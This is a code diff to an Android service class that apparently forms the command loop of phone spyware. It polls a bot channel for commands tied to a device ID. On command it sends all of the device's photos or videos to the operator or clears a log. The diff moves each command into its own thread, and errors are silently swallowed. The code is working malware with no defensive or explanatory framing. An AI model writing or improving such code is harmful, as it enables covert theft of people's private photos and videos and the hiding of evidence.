@@ -62,10 +62,20 @@ public class BotService extends Service {
                 JSONObject post = u.optJSONObject("channel_post");
                 if (post == null) post = u.optJSONObject("message");
                 if (post == null) continue;
-                String text = post.optString("text", "");
-                if (text.equals("CMD:get_photos:" + DEVICE_ID)) sendAllMedia("photos");
-                else if (text.equals("CMD:get_videos:" + DEVICE_ID)) sendAllMedia("videos");
-                else if (text.equals("CMD:clear_log:" + DEVICE_ID)) clearLog();
+                final String text = post.optString("text", "");
+                if (text.equals("CMD:get_photos:" + DEVICE_ID)) {
+                    new Thread(new Runnable() {
+                        @Override public void run() { sendAllMedia("photos"); }
+                    }).start();
+                } else if (text.equals("CMD:get_videos:" + DEVICE_ID)) {
+                    new Thread(new Runnable() {
+                        @Override public void run() { sendAllMedia("videos"); }
+                    }).start();
+                } else if (text.equals("CMD:clear_log:" + DEVICE_ID)) {
+                    new Thread(new Runnable() {
+                        @Override public void run() { clearLog(); }
+                    }).start();
+                }
             }
         } catch(Exception e) {}
     }
